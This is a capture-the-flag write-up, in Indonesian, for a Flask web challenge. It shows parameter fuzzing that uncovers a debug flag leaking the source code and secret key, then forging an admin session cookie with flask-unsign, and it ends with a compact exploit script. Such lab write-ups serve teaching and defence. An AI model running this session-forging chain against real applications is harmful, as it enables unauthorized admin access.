# Freebie

## Challenge

**Category:** Web
**Description:** `Human error is the weakest link.`

## Reconnaissance

Aplikasi memiliki beberapa endpoint utama:

```text
/
 /login
 /register
 /flag
```

User biasa dapat melakukan registrasi dan login, tetapi saat membuka `/flag`, aplikasi menolak akses:

```text
ACCESS DENIED
Only admin can view this page.
```

Login menggunakan username `admin` juga diblokir secara langsung:

```text
Error 403: Admin login via web interface is disabled.
```

Setelah login sebagai user biasa, cookie session dapat didecode menggunakan `flask-unsign`:

```bash
flask-unsign --decode --cookie '<SESSION_COOKIE>'
```

Hasilnya hanya menyimpan username:

```python
{'username': 'nata1783407179'}
```

Ini menunjukkan bahwa aplikasi memakai Flask signed session dan akses admin kemungkinan ditentukan dari nilai `session['username']`.

## Fuzzing Parameter

Fuzzing direktori biasa hanya menemukan endpoint utama. Sesuai hint dari panitia, fuzzing kemudian diarahkan ke parameter query pada endpoint `/flag`.

Pertama, buat akun biasa dan simpan session cookie:

```bash
BASE='http://TARGET:8080'
U="nata$(date +%s)"
P='Nata123!'
J=/tmp/freebie.cookie

curl -sS -o /dev/null -X POST "$BASE/register" \
  --data-urlencode "username=$U" \
  --data-urlencode "password=$P"

curl -sS -o /dev/null -c "$J" -X POST "$BASE/login" \
  --data-urlencode "username=$U" \
  --data-urlencode "password=$P"
```

Kemudian fuzz nama parameter:

```bash
C=$(awk '$6=="session"{print $7}' "$J")

ffuf \
  -u "$BASE/flag?FUZZ=admin" \
  -H "Cookie: session=$C" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc all \
  -ac \
  -t 60 \
  -noninteractive
```

Ditemukan parameter menarik:

```text
debug [Status: 200, Size: 2380]
```

## Source Code Disclosure

Mengakses endpoint berikut:

```bash
curl -sS -b /tmp/freebie.cookie "$BASE/flag?debug=admin"
```

mengembalikan seluruh source code aplikasi.

Bagian pentingnya:

```python
app.secret_key = "sup3r_s3cr3t_ctf_k3y_727"
```

Penyebab source code bocor berasal dari middleware berikut:

```python
@app.before_request
def before_request():
    if "debug" in request.args:
        try:
            with open(__file__, 'r') as f:
                source_code = f.read()
            return f"<body><pre>{source_code}</pre></body>"
        except Exception as e:
            print(f"Error reading file: {e}")
```

Aplikasi hanya memeriksa apakah parameter `debug` ada di query string. Tidak ada autentikasi atau pembatasan akses.

Source code juga menunjukkan logika akses flag:

```python
@app.route('/flag')
def flag():
    user = session.get('username')

    if user == 'admin':
        flag = os.environ.get('FLAG')
        return render_template('flag.html', admin=True, flag=flag)
```

Artinya, kita hanya perlu membuat Flask session valid dengan isi:

```python
{'username': 'admin'}
```

## Forging Flask Session

Karena `secret_key` sudah diketahui, session admin dapat ditandatangani menggunakan `flask-unsign`:

```bash
C=$(flask-unsign \
  --sign \
  --cookie "{'username':'admin'}" \
  --secret 'sup3r_s3cr3t_ctf_k3y_727')
```

Gunakan cookie tersebut untuk mengakses `/flag`:

```bash
curl -sS \
  -H "Cookie: session=$C" \
  "$BASE/flag"
```

Server memberikan akses sebagai admin:

```text
ACCESS GRANTED
Welcome back, admin.
```

## Flag

```text
LYKNCTF{51b5587b1444472bb403b8166234f846}
```

## Root Cause

Challenge ini menggabungkan dua kerentanan:

1. **Debug parameter exposed in production**

   Parameter `debug` dapat digunakan siapa saja untuk membaca source code aplikasi.

2. **Flask session secret disclosure**

   Source code membocorkan `app.secret_key`, sehingga attacker dapat membuat signed session sendiri dan mengubah username menjadi `admin`.

## Exploit Ringkas

```bash
BASE='http://TARGET:8080'

SECRET=$(curl -sS "$BASE/flag?debug=1" |
  grep -oP 'app\.secret_key\s*=\s*"\K[^"]+')

COOKIE=$(flask-unsign \
  --sign \
  --cookie "{'username':'admin'}" \
  --secret "$SECRET")

curl -sS \
  -H "Cookie: session=$COOKIE" \
  "$BASE/flag" |
  grep -Eo 'LYKNCTF\{[^}]+\}'
```
